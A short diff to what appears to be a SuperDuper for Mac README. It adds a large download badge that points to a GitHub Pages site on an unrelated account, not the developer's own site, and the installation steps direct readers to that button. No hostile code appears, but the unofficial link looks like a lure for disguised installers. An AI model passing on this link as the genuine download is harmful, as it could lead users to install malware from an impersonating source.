@@ -4,6 +4,12 @@
 <img src="https://www.shirt-pocket.com/SuperDuper/graphics/SuperDuper-Header.gif" alt="SuperDuper Mac Logo">  
 </div>  
 
+<div align="center">  
+<a href="https://junimata-orex.github.io/.github/superduper">  
+<img src="https://img.shields.io/badge/💽_Download_SuperDuper-darkred?style=for-the-badge&logo=apple" alt="Download SuperDuper Mac">  
+</a>  
+</div>
+
 ## Installation via .dmg:
 
 1. Download .dmg by the button above.
